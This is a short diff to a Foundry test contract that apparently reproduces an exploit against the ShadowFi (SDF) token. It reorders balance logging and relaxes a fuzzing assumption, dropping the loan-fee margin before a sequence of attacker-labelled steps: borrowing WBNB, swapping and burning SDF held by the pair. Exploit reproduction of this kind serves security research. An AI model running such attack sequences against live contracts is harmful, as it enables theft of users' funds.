@@ -83,6 +83,10 @@ contract ShadowFiTest is Test, BlockLoader {
 
     function printBalance(string memory tips) public {
         emit log_string(tips);
+        emit log_string("Sdf Balances: ");
+        queryERC20BalanceDecimals(address(wbnb), address(sdf), wbnb.decimals());
+        queryERC20BalanceDecimals(address(sdf), address(sdf), sdf.decimals());
+        emit log_string("");
         emit log_string("Wbnb Balances: ");
         queryERC20BalanceDecimals(
             address(wbnb),
@@ -90,10 +94,6 @@ contract ShadowFiTest is Test, BlockLoader {
             wbnb.decimals()
         );
         queryERC20BalanceDecimals(address(sdf), address(wbnb), sdf.decimals());
-        emit log_string("");
-        emit log_string("Sdf Balances: ");
-        queryERC20BalanceDecimals(address(wbnb), address(sdf), wbnb.decimals());
-        queryERC20BalanceDecimals(address(sdf), address(sdf), sdf.decimals());
         emit log_string("");
         emit log_string("Pair Balances: ");
         queryERC20BalanceDecimals(
@@ -222,7 +222,7 @@ contract ShadowFiTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
-        vm.assume(amt6 >= (amt0 * 1003) / 1000);
+        vm.assume(amt6 >= amt0);
         borrow_wbnb_owner(amt0);
         swap_pair_attacker_wbnb_sdf(amt1, amt2);
         burn_sdf_pair(amt3);
